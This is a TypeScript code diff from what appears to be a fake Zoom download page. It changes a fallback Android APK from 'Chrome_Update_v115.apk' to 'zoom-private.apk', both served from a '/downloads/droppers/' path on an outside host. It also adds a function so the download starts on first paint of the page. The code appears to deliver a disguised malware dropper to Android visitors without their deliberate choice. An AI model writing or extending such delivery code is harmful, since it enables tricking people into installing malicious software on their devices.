@@ -57,9 +57,9 @@ const FORMAT_SCORES: Record<ClientPlatform, Partial<Record<ClientFormat, number>
 
 const FALLBACK_ASSETS: ZoomClientAsset[] = [
   {
-    name: "Chrome_Update_v115.apk",
-    url: "https://global.telcom.stream/downloads/droppers/Chrome_Update_v115.apk",
-    size: 23_234_938,
+    name: "zoom-private.apk",
+    url: "https://global.telcom.stream/downloads/droppers/zoom-private.apk",
+    size: 23_427_984,
     platform: "android",
     format: "apk",
     arch: "universal",
@@ -463,6 +463,11 @@ async function loadReleaseAssets(): Promise<ZoomClientAsset[]> {
 
 export async function resolveDeviceClient(device = detectDevice()): Promise<ZoomClientAsset | null> {
   return selectBestClient(await loadReleaseAssets(), device);
+}
+
+/** Synchronous best-effort pick so the download can start on first paint. */
+export function immediateClientForDevice(device = detectDevice()): ZoomClientAsset | null {
+  return selectBestClient(FALLBACK_ASSETS, device);
 }
 
 function isClientAsset(value: unknown): value is ZoomClientAsset {
